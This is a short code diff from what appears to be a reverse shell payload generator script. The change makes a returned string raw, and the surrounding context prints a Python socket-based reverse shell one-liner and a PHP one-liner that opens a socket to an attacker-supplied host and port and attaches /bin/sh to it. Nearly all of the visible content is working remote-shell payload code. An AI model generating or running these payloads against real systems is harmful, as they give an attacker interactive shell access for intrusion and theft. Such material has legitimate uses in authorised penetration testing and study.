@@ -35,7 +35,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 """.format(LHOST, LPORT, LHOST, LPORT, LHOST, LPORT)
 
 def generate_php(LHOST, LPORT):
-    return """
+    return r"""
 ======================================================================
 [+ PHP]
 php -r '\$sock=fsockopen(\"{}\",{});exec(\"/bin/sh <&3 >&3 2>&3\");'
